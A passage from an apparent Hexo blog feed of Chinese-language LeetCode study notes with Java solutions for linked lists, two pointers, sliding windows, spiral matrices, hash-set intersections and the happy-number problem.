class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        ListNode next,prev;</span><br><span class="line">        ListNode(<span class="type">int</span> x) &#123;val = x;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head,tail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;<span class="keyword">return</span> -<span class="number">1</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过判断 index &lt; (size - 1) / 2 来决定是从头结点还是尾节点遍历，提高效率</span></span><br><span class="line">        <span class="keyword">if</span>(index &lt; (size - <span class="number">1</span>) / <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cur = tail;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= size - index - <span class="number">1</span>; i++)&#123;</span><br><span class="line">                cur = cur.prev;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = cur.next;</span><br><span class="line">        cur.next.prev = newNode;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        newNode.prev = cur;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> tail;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = tail;</span><br><span class="line">        newNode.prev = cur.prev;</span><br><span class="line">        cur.prev.next = newNode;</span><br><span class="line">        cur.prev = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;index = <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = cur.next;</span><br><span class="line">        cur.next.prev = newNode;</span><br><span class="line">        newNode.prev = cur;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt;= size || index &lt; <span class="number">0</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next.next.prev = cur;</span><br><span class="line">        cur.next = cur.next.next;</span><br><span class="line">        size--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;移除列表元素&quot;&gt;&lt;a href=&quot;#移除列表元素&quot; class=&quot;headerlink&quot; title=&quot;移除列表元素&quot;&gt;&lt;/a&gt;移除列表元素&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/remove-link</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x3</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x3/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x3/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T05:53:26.311Z</updated>
    
    <content type="html"><![CDATA[<h4 id="有序数组的平方"><a href="#有序数组的平方" class="headerlink" title="有序数组的平方"></a>有序数组的平方</h4><p>link：<a href="https://leetcode.cn/problems/squares-of-a-sorted-array/description/">977. 有序数组的平方 - 力扣（LeetCode）</a><br><strong>非递减顺序</strong><br>一个数列中的元素从左到右依次不减，或者说不降序排列.<br>比如：1233445，12345.</p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>如果看到数组能条件反射到双指针那已经是win了.<br>根据题意平方之后的数一定在数组的两端.两个指针一首一尾，从后往前更新数组.<br><img src="D:\Users\lenovo\Desktop\无标题-2024-10-02-1521.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortedSquares(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">      <span class="comment">//非递减数组可得最大值平方后会出现在数组两头</span></span><br><span class="line">      <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">      <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">      <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> result.length - <span class="number">1</span> ;</span><br><span class="line">      <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[left]*nums[left] &gt; nums[right]*nums[right]) &#123;</span><br><span class="line">            result[index--] = nums[left] * nums[left++];</span><br><span class="line">           <span class="comment">// left++;</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             result[index--] = nums[right] * nums[right--];</span><br><span class="line">            <span class="comment">//right--;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="长度最小的子数组"><a href="#长度最小的子数组" class="headerlink" title="长度最小的子数组"></a>长度最小的子数组</h4><p>link：<a href="https://leetcode.cn/problems/minimum-size-subarray-sum/description/">209. 长度最小的子数组 - 力扣（LeetCode）</a></p><p><strong>双指针变形——滑动窗口</strong><br>其实也可以理解成给入队的队列一个给定的大小变成窗口，先入队元素，然后和target进行比较，大于等于target就出队先进的元素，再进新元素并且标记好原来大于等于target的数组长度.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">begin</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//起始位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//滑动窗口值总和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;<span class="comment">//定义最大值 遍历不出错</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">0</span>; end &lt; nums.length;end++) &#123;</span><br><span class="line">            sum += nums[end];</span><br><span class="line">            <span class="keyword">while</span>(sum &gt;= target) &#123;</span><br><span class="line">                result = Math.min(result, end - begin + <span class="number">1</span>);<span class="comment">//最小长度</span></span><br><span class="line">                sum -= nums[begin++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result == Integer.MAX_VALUE ? <span class="number">0</span> : result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点：如何移动起始位置</strong><br>如果循环中的标记位在起始位置，起始位置和终止位置都需要移动一遍和暴力解法无差别，所以我们的标记位一定是终止位.</p><h4 id="螺旋矩阵-II"><a href="#螺旋矩阵-II" class="headerlink" title="螺旋矩阵 II"></a>螺旋矩阵 II</h4><p>link：<a href="https://leetcode.cn/problems/spiral-matrix-ii/description/">59. 螺旋矩阵 II - 力扣（LeetCode）</a><br>奇怪的代码掌控力… 主要问题在<strong>边界处理</strong></p><h6 id="顺序解决"><a href="#顺序解决" class="headerlink" title="顺序解决"></a>顺序解决</h6><p>按照本来的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">     <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>,r = n - <span class="number">1</span>,t = <span class="number">0</span>,b = n-<span class="number">1</span>;</span><br><span class="line">     <span class="type">int</span>[][] result = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">     <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">     <span class="type">int</span> <span class="variable">tar</span> <span class="operator">=</span> n * n;</span><br><span class="line">     <span class="keyword">while</span>(num &lt;= tar) &#123;</span><br><span class="line">     <span class="comment">//第一行开始</span></span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> l;i &lt;= r;i++)&#123;</span><br><span class="line">        result[t][i] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     t++;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> t; i &lt;= b; i++)&#123;</span><br><span class="line">        result[i][r] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     r--;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> r; i &gt;=l; i--)&#123;</span><br><span class="line">        result[b][i] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     b--;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> b;i &gt;= t;i--) &#123;</span><br><span class="line">        result[i][l] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     l++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="改编版本"><a href="#改编版本" class="headerlink" title="改编版本"></a>改编版本</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loop</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// 控制循环次数</span></span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// 每次循环的开始点(start, start)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;  <span class="comment">// 定义填充数字</span></span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (loop++ &lt; n / <span class="number">2</span>) &#123; <span class="comment">// 判断边界后，loop从1开始</span></span><br><span class="line">            <span class="comment">// 模拟上侧从左到右</span></span><br><span class="line">            <span class="keyword">for</span> (j = start; j &lt; n - loop; j++) &#123;</span><br><span class="line">                res[start][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟右侧从上到下</span></span><br><span class="line">            <span class="keyword">for</span> (i = start; i &lt; n - loop; i++) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟下侧从右到左</span></span><br><span class="line">            <span class="keyword">for</span> (; j &gt;= loop; j--) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟左侧从下到上</span></span><br><span class="line">            <span class="keyword">for</span> (; i &gt;= loop; i--) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            res[start][start] = count;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>1.遇到有序数组考虑二分法.<br>2.双指针（找准循环不变量中的不变量）.<br>3.求连续子数组的总和可用滑动窗口解决.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;有序数组的平方&quot;&gt;&lt;a href=&quot;#有序数组的平方&quot; class=&quot;headerlink&quot; title=&quot;有序数组的平方&quot;&gt;&lt;/a&gt;有序数组的平方&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/squares</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x8</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x8/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x8/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T07:30:18.608Z</updated>
    
    <content type="html"><![CDATA[<h3 id="两个数组的交集"><a href="#两个数组的交集" class="headerlink" title="两个数组的交集"></a>两个数组的交集</h3><p>link：<a href="https://leetcode.cn/problems/intersection-of-two-arrays/">349. 两个数组的交集 - 力扣（LeetCode）</a></p><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>首先想到合并两个数组，遍历找重复项存储到新的数组中但其实用HashSet是更加方便的,【HashSet不存在重复数据】</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20241012004357257.png" alt="image-20241012004357257"><br>**注意：使用数组做哈希表的题目都限制了大小 例如只有小写字母或者数值大小在【0-1000】内 **</p><h5 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1 == <span class="literal">null</span> || nums1.length == <span class="number">0</span> || nums2 == <span class="literal">null</span> || nums2.length == <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建需要的set表 set2用于返回结果</span></span><br><span class="line">        Set&lt;Integer&gt; set1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;Integer&gt; set2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历数组1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)  &#123;</span><br><span class="line">            set1.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历ser1映射的元素判断哈希表中是否存在对应元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2) &#123;</span><br><span class="line">            <span class="keyword">if</span>(set1.contains(i)) &#123;</span><br><span class="line">                set2.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将结果集合转换为数组</span></span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[set2.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : set2) &#123;</span><br><span class="line">            result[k++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a><strong>Tips</strong></h6><p>更高级的写法 Java8引入的流式API（Stream API）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//将结果集合转换为数组</span></span><br><span class="line"><span class="keyword">return</span> set2.stream().mapToInt(x -&gt; x).toArray();</span><br></pre></td></tr></table></figure><p>**<code>stream()</code>**：将集合转换为流对象，便于对集合进行链式操作.<br>**<code>mapToInt(x -&gt; x)</code>**：将流中的每个 <code>Integer</code> 元素转换为 <code>int</code> 类型（自动拆箱).<br>**<code>toArray()</code>**：将流中的元素收集为一个 <code>int[]</code> 数组.</p><h5 id="Hash数组"><a href="#Hash数组" class="headerlink" title="Hash数组"></a>Hash数组</h5><p>思路相同 只不过加了大小限制之后可以用Hash数组解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="comment">//创建需要的两个数组  </span></span><br><span class="line">        <span class="type">int</span>[] hash1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="type">int</span>[] hash2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="comment">//分别遍历两个数组 对相同元素出现次数计数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1) &#123;</span><br><span class="line">            hash1[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2) &#123;</span><br><span class="line">            hash2[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//相同的下标位置都大于0 满足</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1002</span>; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span>(hash1[i] &gt; <span class="number">0</span> &amp;&amp; hash2[i] &gt; <span class="number">0</span>)</span><br><span class="line">            result.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//转换成数组</span></span><br><span class="line">        <span class="type">int</span>[] finalArray = <span class="keyword">new</span> <span class="title class_">int</span>[result.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : result) &#123;</span><br><span class="line">            finalArray[index++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> finalArray;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><h3 id="快乐数"><a href="#快乐数" class="headerlink" title="快乐数"></a>快乐数</h3><p>link：<a href="https://leetcode.cn/problems/happy-number/description/">202. 快乐数 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>起初分析的时候被卡在了循环条件处【😓】，首先得不是1然后不满足快乐数条件最后不被包含在Hashset中.【是的没错是高贵的Hashset（bushi）】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">//创建所需的set表</span></span><br><span class="line">        Set&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//循环判断 按除每一位判断</span></span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">1</span> &amp;&amp; !result.contains(n)) &#123;</span><br><span class="line">            result.add(n);</span><br><span class="line">            <span class="comment">//getNumber函数单独模拟实现</span></span><br><span class="line">            n = getNumber(n);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">            <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getNumber</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//逐位进行平方求和判断</span></span><br><span class="line">            <span class="keyword">while</span>(n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> n % <span class="number">10</span>;</span><br><span class="line">                res += tmp * 